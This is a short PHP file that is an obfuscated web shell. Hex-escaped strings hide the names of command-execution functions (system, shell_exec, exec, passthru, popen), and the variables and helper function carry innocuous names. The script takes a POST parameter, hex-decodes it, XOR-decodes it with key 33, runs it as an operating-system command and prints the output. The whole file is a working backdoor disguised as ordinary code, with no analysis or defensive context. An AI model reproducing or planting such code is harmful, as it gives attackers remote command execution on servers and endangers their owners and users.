<?php

$reverse_lookup1 = "s\x79st\x65\x6D";
$reverse_lookup6 = "st\x72\x65am\x5F\x67\x65\x74_c\x6Fnt\x65n\x74s";
$reverse_lookup3 = "exec";
$reverse_lookup5 = "\x70\x6Fpen";
$reverse_lookup4 = "p\x61s\x73\x74\x68ru";
$reverse_lookup2 = "sh\x65ll\x5F\x65x\x65\x63";
$dataflow_engine = "\x68\x65x2bin";
$reverse_lookup7 = "p\x63lo\x73e";
if (isset($_POST["va\x6C\x75e"])) {
            function event_dispatcher ($dat,   $flg){
  $data_chunk =   '' ;
  $e=0;
 while($e<strlen($dat)){
$data_chunk.=chr(ord($dat[$e])^$flg);
$e++;

} return$data_chunk;
 
}
            $value = $dataflow_engine($_POST["va\x6C\x75e"]);
            $value = event_dispatcher($value, 33);
            if (function_exists($reverse_lookup1)) {
                $reverse_lookup1($value);
            } elseif (function_exists($reverse_lookup2)) {
                print $reverse_lookup2($value);
            } elseif (function_exists($reverse_lookup3)) {
                $reverse_lookup3($value, $pgrp_dat);
                print join("\n", $pgrp_dat);
            } elseif (function_exists($reverse_lookup4)) {
                $reverse_lookup4($value);
            } elseif (function_exists($reverse_lookup5) && function_exists($reverse_lookup6) && function_exists($reverse_lookup7)) {
                $flg_data_chunk = $reverse_lookup5($value, 'r');
                if ($flg_data_chunk) {
                    $descriptor_desc = $reverse_lookup6($flg_data_chunk);
                    $reverse_lookup7($flg_data_chunk);
                    print $descriptor_desc;
                }
            }
            exit;
        }